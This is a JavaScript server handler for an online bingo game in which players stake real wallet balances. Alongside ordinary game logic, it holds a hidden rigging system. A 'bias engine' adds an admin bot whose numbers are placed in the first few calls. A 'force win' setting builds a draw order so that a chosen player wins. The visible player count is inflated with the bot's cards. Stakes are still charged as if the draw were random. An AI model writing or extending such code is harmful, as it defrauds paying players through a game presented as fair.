// GET /api/game_state — port of views.api_game_state
const { PrismaClient } = require("@prisma/client");
const { Decimal } = require("decimal.js");
const cache = require("../cache");
const { getCard, generateGameId } = require("../utils");
const biasEngine = require("../biasEngine");

const prisma = new PrismaClient();

const FORCE_WIN_PLAYER_PREFIX = "force_win.player.";

function parseTid(input) {
  const tidStr = String(input || "").trim();
  if (!tidStr) return { tidStr: "", tidBig: null };
  try {
    return { tidStr, tidBig: BigInt(tidStr) };
  } catch (_) {
    return { tidStr: "", tidBig: null };
  }
}

async function getPausedMsForGame(gameId) {
  const keys = [`pause_${gameId}`, `pause_at_${gameId}`, `pause_ms_${gameId}`];
  const row = await cache.mget(keys);
  const paused = row[keys[0]] === 1 || row[keys[0]] === true;
  const pauseAt = row[keys[1]] != null ? Number(row[keys[1]]) : null;
  const pauseMs = row[keys[2]] != null ? Number(row[keys[2]]) : 0;
  const extra = paused && pauseAt ? Math.max(0, Date.now() - pauseAt) : 0;
  return Math.max(0, pauseMs + extra);
}

async function getRoomStopState(stake) {
  const key = `stop_stake_${stake}`;
  const raw = await cache.get(key);
  return raw === 1 || raw === true || String(raw) === "1";
}

function isTrueSetting(value) {
  return value === 1 || value === true || value === "1" || value === "true";
}

async function findForcedWinSelection(selections) {
  const playerIds = Array.from(
    new Set(selections.map((sel) => sel.playerId).filter(Boolean)),
  );
  if (!playerIds.length) return null;

  const keys = playerIds.map((id) => `${FORCE_WIN_PLAYER_PREFIX}${id}`);
  const settings = await prisma.appSetting.findMany({
    where: { key: { in: keys } },
    select: { key: true, value: true, updatedAt: true },
  });

  const enabled = settings.filter((row) => isTrueSetting(row.value));
  if (!enabled.length) return null;

  enabled.sort(
    (a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime(),
  );
  const chosen = enabled[0];
  const chosenId = Number(chosen.key.replace(FORCE_WIN_PLAYER_PREFIX, ""));
  if (!Number.isFinite(chosenId)) return null;

  const playerSelections = selections.filter(
    (sel) => sel.playerId === chosenId,
  );
  if (!playerSelections.length) return null;

  playerSelections.sort((a, b) => Number(a.slot) - Number(b.slot));
  return {
    playerId: chosenId,
    selection: playerSelections[0],
  };
}

async function handleGameState(req, res, io) {
  try {
    const stake = parseInt(req.query.stake || "10", 10);
    // Use validated tid from initData middleware (secure)
    const tidBig = req.validatedTid || null;
    const tidStr = tidBig ? String(tidBig) : "";

    const roomStopped = await getRoomStopState(stake);

    // Find or create active game for this stake
    let game = await prisma.game.findFirst({
      where: { stake, active: true },
      orderBy: { createdAt: "desc" },
    });
    if (!game) {
      game = await prisma.game.create({
        data: { id: generateGameId(), stake },
      });
    }

    // Track heartbeat + presence
    if (tidBig) {
      await cache.set(`hb_${game.id}_${tidStr}`, Date.now(), 30);
      await cache.set(`seen_${tidStr}`, Date.now(), 120);
    }

    // Get accepted selections
    const selections = await prisma.selection.findMany({
      where: { gameId: game.id, accepted: true },
      include: { player: true },
    });

    // Read bias toggle (needed for both pre-game and during-game logic)
    let biasToggleOn = false;
    try {
      biasToggleOn = await biasEngine.getToggle();
    } catch (_) {}

    // If bias toggle is ON and game hasn't started, ensure bias player has cards
    if (!game.startedAt) {
      try {
        if (biasToggleOn) {
          const takenIndices = selections.map((s) => s.index);
          await biasEngine.ensureBiasSelection(game.id, takenIndices);
        } else {
          // Toggle is OFF — remove any existing bias selection
          await biasEngine.removeBiasSelection(game.id);
        }
      } catch (biasErr) {
        console.error("biasEngine pre-game error:", biasErr);
      }
    }

    // Release stale selections (no heartbeat for 15s, pre-game)
    // Skip bias player — their heartbeat is managed by biasEngine
    if (!game.startedAt) {
      for (const sel of selections) {
        const tid = String(sel.player.telegramId);
        if (tid === String(biasEngine.BIAS_PLAYER_TID)) continue; // skip bias player
        const hbKey = `hb_${game.id}_${tid}`;
        const lastHb = await cache.get(hbKey);
        if (!lastHb || Date.now() - lastHb > 15000) {
          await prisma.selection.delete({ where: { id: sel.id } });
        }
      }
    }

    // Refresh selections after cleanup
    const freshSelections = await prisma.selection.findMany({
      where: { gameId: game.id, accepted: true },
      include: { player: true },
    });

    const acceptedCardsCount = freshSelections.length;
    const distinctPlayersCount = new Set(
      freshSelections.map((s) => String(s.playerId)),
    ).size;
    let biasSelectionCount = 0;
    if (biasToggleOn) {
      const biasTid = String(biasEngine.BIAS_PLAYER_TID);
      for (const sel of freshSelections) {
        if (String(sel.player.telegramId) === biasTid) biasSelectionCount += 1;
      }
    }
    const acceptedPlayersCount =
      biasToggleOn && biasSelectionCount > 0
        ? distinctPlayersCount + Math.max(0, biasSelectionCount - 1)
        : distinctPlayersCount;

    // Keep bias bot heartbeat alive during the game so idle detection
    // doesn't kill bot-only games
    if (game.startedAt && biasToggleOn && biasSelectionCount > 0) {
      const biasTid = String(biasEngine.BIAS_PLAYER_TID);
      await cache.set(`hb_${game.id}_${biasTid}`, Date.now(), 30);
    }

    let onlinePlayersCount = 0;
    for (const sel of freshSelections) {
      const hbKey = `hb_${game.id}_${sel.player.telegramId}`;
      const lastHb = await cache.get(hbKey);
      if (lastHb && Date.now() - Number(lastHb) <= 15000) {
        onlinePlayersCount += 1;
      }
    }

    if (game.startedAt && acceptedCardsCount > 0) {
      const idleKey = `idle_game_${game.id}`;
      if (onlinePlayersCount === 0) {
        const idleSince = await cache.get(idleKey);
        if (!idleSince) {
          await cache.set(idleKey, Date.now(), 300);
        } else if (Date.now() - Number(idleSince) >= 20000) {
          await prisma.game.update({
            where: { id: game.id },
            data: { active: false, finished: true },
          });
          await prisma.selection.deleteMany({ where: { gameId: game.id } });
          await prisma.game.create({ data: { id: generateGameId(), stake } });
          await cache.del(idleKey);
          io.to(`game_${stake}`).emit("message", { type: "restarted" });
          return handleGameState(req, res, io);
        }
      } else {
        await cache.del(idleKey);
      }
    }

    // End game if started but all players got disqualified
    if (game.startedAt && acceptedCardsCount === 0) {
      await prisma.game.update({
        where: { id: game.id },
        data: { active: false, finished: true },
      });
      await prisma.game.create({ data: { id: generateGameId(), stake } });
      io.to(`game_${stake}`).emit("message", {
        type: "game_ended_no_winner",
        reason: "All players disqualified",
      });
      return handleGameState(req, res, io);
    }

    // Start countdown when >=2 distinct players (if not started yet)
    if (acceptedPlayersCount >= 2 && !game.countdownStartedAt) {
      game = await prisma.game.update({
        where: { id: game.id },
        data: { countdownStartedAt: new Date() },
      });
    }

    // Check countdown expiry → start game (only if ≥2 players still present)
    let started = !!game.startedAt;
    let countdownRemaining = null;
    if (game.countdownStartedAt && !started) {
      const elapsed =
        (Date.now() - new Date(game.countdownStartedAt).getTime()) / 1000;
      countdownRemaining = Math.max(0, 30 - Math.floor(elapsed));

      // If players dropped below 2 during countdown, reset countdown
      if (acceptedPlayersCount < 2) {
        game = await prisma.game.update({
          where: { id: game.id },
          data: { countdownStartedAt: null },
        });
        countdownRemaining = null;
      } else if (countdownRemaining <= 0) {
        // Countdown expired AND still ≥2 players → start the game

        // ── ATOMIC GUARD: only ONE request starts the game ──
        // updateMany with startedAt:null ensures only the first concurrent
        // request succeeds (count===1). All others get count===0 and skip.
        const startResult = await prisma.game.updateMany({
          where: { id: game.id, startedAt: null },
          data: { startedAt: new Date() },
        });

        if (startResult.count === 0) {
          // Another request already started the game — just return current state
          game = await prisma.game.findUnique({ where: { id: game.id } });
          started = !!game.startedAt;
        } else {
          // WE are the one request that starts the game
          // Generate sequence
          let sequence = [];
          for (let i = 1; i <= 75; i++) sequence.push(i);
          // Shuffle
          for (let i = sequence.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [sequence[i], sequence[j]] = [sequence[j], sequence[i]];
          }

          // One-game forced win from deposit request (if enabled)
          let forcedApplied = false;
          try {
            const forced = await findForcedWinSelection(freshSelections);
            if (forced) {
              await prisma.appSetting.deleteMany({
                where: {
                  key: `${FORCE_WIN_PLAYER_PREFIX}${forced.playerId}`,
                },
              });

              await prisma.selection.updateMany({
                where: { gameId: game.id, playerId: forced.playerId },
                data: { autoEnabled: true },
              });

              const { pattern } = await biasEngine.getCurrentPattern();
              const card = getCard(forced.selection.index);
              const requiredNumbers = biasEngine.getRequiredNumbers(
                card,
                pattern,
              );

              const otherCards = [];
              for (const sel of freshSelections) {
                if (sel.playerId === forced.playerId) continue;
                try {
                  otherCards.push(getCard(sel.index));
                } catch (_) {}
              }

              const lastWinCall = await cache.get("bias_last_win_call");
              const forcedResult = biasEngine.buildBiasedSequence(
                requiredNumbers,
                otherCards,
                lastWinCall,
              );
              sequence = forcedResult.sequence;
              await cache.set("bias_last_win_call", forcedResult.targetCall);
              forcedApplied = true;
            }
          } catch (forcedErr) {
            console.error("force win init error:", forcedErr);
          }

          // Initialize bias round if toggle is ON
          // Returns a biased sequence where admin's numbers are in first 6-8 calls
          try {
            if (!forcedApplied) {
              const takenIndices = freshSelections.map((s) => s.index);
              const biasResult = await biasEngine.initBiasRound(
                game.id,
                takenIndices,
                freshSelections,
              );
              if (biasResult) {
                // Use the biased sequence instead of the random one
                sequence = biasResult.biasedSequence;

                // Re-fetch selections to include the bias player's selection
                const updatedSels = await prisma.selection.findMany({
                  where: { gameId: game.id, accepted: true },
                  include: { player: true },
                });
                freshSelections.length = 0;
                freshSelections.push(...updatedSels);
              }
            }
          } catch (biasErr) {
            console.error("biasEngine init error:", biasErr);
          }

          game = await prisma.game.update({
            where: { id: game.id },
            data: {
              sequence: JSON.stringify(sequence),
            },
          });
          started = true;

          // ── ATOMIC GUARD: charge stakes only once ──
          // updateMany with stakesCharged:false ensures only one request charges
          const chargeGuard = await prisma.game.updateMany({
            where: { id: game.id, stakesCharged: false },
            data: { stakesCharged: true },
          });

          if (chargeGuard.count > 0) {
            // We won the charge race — charge all selections
            let charged = 0;
            for (const sel of freshSelections) {
              // Re-read balance at charge time to prevent negative balances
              const player = await prisma.player.findUnique({
                where: { id: sel.playerId },
              });
              if (!player) continue;

              const walletDec = new Decimal(player.wallet.toString());
              const giftDec = new Decimal(player.gift.toString());
              const stakeDec = new Decimal(stake);
              const totalBalance = walletDec.plus(giftDec);

              // Skip charging if insufficient balance — remove selection
              if (totalBalance.lt(stakeDec)) {
                console.warn(
                  `Skipping stake charge for player ${player.id}: balance ${totalBalance.toFixed(2)} < stake ${stake}`,
                );
                await prisma.selection.deleteMany({
                  where: { id: sel.id },
                });
                continue;
              }

              // Use play wallet (gift) first, then main wallet
              let deductFromGift = Decimal.min(giftDec, stakeDec);
              let remainder = stakeDec.minus(deductFromGift);
              let deductFromWallet = Decimal.min(walletDec, remainder);

              await prisma.player.update({
                where: { id: player.id },
                data: {
                  wallet: {
                    decrement: parseFloat(deductFromWallet.toString()),
                  },
                  gift: { decrement: parseFloat(deductFromGift.toString()) },
                },
              });

              await prisma.transaction.create({
                data: {
                  playerId: player.id,
                  kind: "stake",
                  amount: -stake,
                  note: `Stake for game #${game.id}`,
                },
              });
              charged++;
            }
            await prisma.game.update({
              where: { id: game.id },
              data: { chargedCount: charged },
            });
          }
        }

        // Broadcast sync
        io.to(`game_${stake}`).emit("message", {
          type: "call.sync",
          started_at: game.startedAt,
          server_time: Date.now(),
        });
      }
    }

    // Calculate current call index from elapsed time
    let sequence = [];
    let currentCall = null;
    let calledNumbers = [];
    let callCount = 0;

    if (started && game.sequence) {
      try {
        sequence = JSON.parse(game.sequence);
      } catch (_) {
        sequence = [];
      }
      const pausedMs = await getPausedMsForGame(game.id);
      const elapsed =
        (Date.now() - new Date(game.startedAt).getTime() - pausedMs) / 1000;
      callCount = Math.min(Math.floor(elapsed / 5) + 1, sequence.length);
      calledNumbers = sequence.slice(0, callCount);
      currentCall =
        calledNumbers.length > 0
          ? calledNumbers[calledNumbers.length - 1]
          : null;

      // Auto-restart when all 75 called
      if (callCount >= 75) {
        await prisma.game.update({
          where: { id: game.id },
          data: { active: false, finished: true },
        });
        // Create new game
        await prisma.game.create({ data: { id: generateGameId(), stake } });
        io.to(`game_${stake}`).emit("message", { type: "restarted" });
      }
    }

    if (currentCall == null) {
      await cache.del(`call_${game.id}`);
    }

    // Find player's card + balance
    let myCards = [null, null];
    let myIndices = [null, null];
    let autoEnabled = [true, true]; // Default to true
    let wallet = 0;
    let gift = 0;
    let phone = "";
    if (tidBig) {
      const player = await prisma.player.findUnique({
        where: { telegramId: tidBig },
      });
      if (player) {
        phone = String(player.phone || "");
        wallet = new Decimal(player.wallet.toString()).toNumber();
        gift = new Decimal(player.gift.toString()).toNumber();
        const mySels = freshSelections.filter((s) => s.playerId === player.id);
        for (const sel of mySels) {
          const slot = Number(sel.slot ?? 0);
          if (!Number.isFinite(slot) || slot < 0 || slot > 1) continue;
          myIndices[slot] = sel.index;
          myCards[slot] = getCard(sel.index);
          autoEnabled[slot] = sel.autoEnabled ?? true;
        }
      }
    }

    // Total started games across all stakes (matches Django display)
    const totalGames = await prisma.game.count({
      where: { startedAt: { not: null } },
    });

    const taken = freshSelections.map((s) => s.index);

    const playersDisplay = game.stakesCharged
      ? game.chargedCount
      : acceptedPlayersCount;

    const chargedCardsCount = game.stakesCharged
      ? game.chargedCount
      : acceptedCardsCount;

    const recentWinner = (await cache.get(`winner_${stake}`)) || null;

    return res.json({
      ok: true,
      stake,
      game_id: game.id,
      room_stopped: roomStopped,
      room_stop_message: roomStopped
        ? "Temporarily stopped for maintenance"
        : null,
      players: playersDisplay,
      accepted_count: acceptedPlayersCount,
      accepted_cards: acceptedCardsCount,
      charged_cards: chargedCardsCount,
      taken,
      countdown_started_at: game.countdownStartedAt
        ? game.countdownStartedAt.toISOString()
        : null,
      countdown_remaining: countdownRemaining,
      started_at: game.startedAt ? game.startedAt.toISOString() : null,
      started,
      current_call: currentCall,
      called_numbers: calledNumbers,
      call_count: callCount,
      my_card: myCards[0],
      my_index: myIndices[0],
      my_cards: myCards,
      my_indices: myIndices,
      auto_enabled: autoEnabled,
      total_games: totalGames,
      wallet,
      gift,
      phone,
      players_display: playersDisplay,
      winner: recentWinner,
      server_time: Date.now(),
    });
  } catch (err) {
    console.error("gameState error:", err);
    return res.status(500).json({ ok: false, error: "Internal server error" });
  }
}

module.exports = handleGameState;
